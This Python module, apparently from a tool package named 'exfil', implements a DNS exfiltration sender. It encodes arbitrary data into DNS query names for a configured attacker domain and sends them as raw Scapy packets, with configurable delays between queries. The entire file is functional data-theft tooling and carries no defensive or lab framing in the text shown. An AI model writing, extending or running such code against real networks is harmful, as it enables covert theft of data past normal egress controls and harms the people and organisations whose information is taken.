# DNS sender.
# Crafts and transmits DNS query packets using Scapy to exfiltrate encoded data.
#
# Packet structure per query:
#   IP(dst=dns_server) / UDP(sport=src_port, dport=dns_server_port) /
#   DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
#
# Uses send() (layer 3, fire-and-forget). No response is expected or waited for.

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field

from scapy.all import DNS, DNSQR, IP, UDP, send

from exfil.config import ExfilConfig
from exfil.encoder import DNSExfilEncoder

logger = logging.getLogger(__name__)


@dataclass
class ExfilResult:
    """Statistics returned after a complete exfiltration session.

    Attributes:
        chunks_sent: Number of data DNS queries sent (excludes the terminator).
        bytes_encoded: Original payload size in bytes.
        total_queries: chunks_sent + 1; the terminator query is included.
        elapsed_seconds: Wall time from first to last send() call.
        queries_per_second: total_queries / elapsed_seconds; 0.0 if elapsed is 0.
        target_domain: The target_domain from the config used for this session.
        dns_server: The dns_server from the config used for this session.
        errors: Per-query error messages for any send() failures.
    """

    chunks_sent: int
    bytes_encoded: int
    total_queries: int
    elapsed_seconds: float
    queries_per_second: float
    target_domain: str
    dns_server: str
    errors: list[str] = field(default_factory=list)


class DNSSender:
    """Crafts and sends DNS queries to exfiltrate encoded data using Scapy.

    Each query is a raw UDP/DNS packet sent with Scapy's send() (layer 3,
    fire-and-forget). No response is expected or waited for. The packet
    structure is:
        IP(dst=config.dns_server) /
        UDP(sport=config.src_port, dport=config.dns_server_port) /
        DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))

    Args:
        config: ExfilConfig instance controlling domain, server, timing.
    """

    def __init__(self, config: ExfilConfig) -> None:
        self.config = config

    def send_query(self, fqdn: str) -> bool:
        """Craft and send a single DNS A-record query for fqdn using Scapy.

        Builds the full packet stack: IP / UDP / DNS / DNSQR. Sends at layer 3
        (fire-and-forget) with no response expected or waited for.

        Args:
            fqdn: Fully-qualified domain name to query.

        Returns:
            True if the packet was sent without exception, False otherwise.
            Failures are logged at WARNING level.
        """
        packet = (
            IP(dst=self.config.dns_server)
            / UDP(sport=self.config.src_port, dport=self.config.dns_server_port)
            / DNS(rd=1, qd=DNSQR(qname=fqdn, qtype="A"))
        )
        try:
            send(packet, verbose=0)
            return True
        except Exception as exc:
            logger.warning("send_query failed for %s: %s", fqdn, exc)
            return False

    def exfiltrate(self, data: bytes) -> ExfilResult:
        """Encode data and transmit all resulting DNS queries with configured timing.

        Encodes the payload into DNS FQDNs, sends each query via send_query(),
        and sleeps config.inter_query_delay_seconds between consecutive queries.
        The delay is applied between queries only — not after the final one.
        Any send failures are recorded in ExfilResult.errors.

        Args:
            data: Raw bytes to transmit. An empty payload returns an all-zero
                  ExfilResult immediately with no queries sent.

        Returns:
            ExfilResult with transmission statistics for the session.
        """
        if not data:
            return ExfilResult(
                chunks_sent=0,
                bytes_encoded=0,
                total_queries=0,
                elapsed_seconds=0.0,
                queries_per_second=0.0,
                target_domain=self.config.target_domain,
                dns_server=self.config.dns_server,
            )

        encoder = DNSExfilEncoder(
            target_domain=self.config.target_domain,
            chunk_size=self.config.chunk_size,
            encoding=self.config.encoding,
        )
        encode_result = encoder.encode(data)
        fqdns = encode_result.fqdns
        total = len(fqdns)
        errors: list[str] = []

        start = time.monotonic()

        for i, fqdn in enumerate(fqdns):
            logger.debug("sending query %d/%d: %s", i + 1, total, fqdn)
            success = self.send_query(fqdn)
            if not success:
                errors.append(f"query failed: {fqdn}")
            if i < total - 1:
                time.sleep(self.config.inter_query_delay_seconds)

        elapsed = time.monotonic() - start
        qps = total / elapsed if elapsed > 0 else 0.0

        logger.info(
            "exfil complete: %d queries, %d bytes, %.2fs",
            total,
            encode_result.encoded_bytes,
            elapsed,
        )

        return ExfilResult(
            chunks_sent=encode_result.chunk_count,
            bytes_encoded=encode_result.encoded_bytes,
            total_queries=total,
            elapsed_seconds=elapsed,
            queries_per_second=qps,
            target_domain=self.config.target_domain,
            dns_server=self.config.dns_server,
            errors=errors,
        )
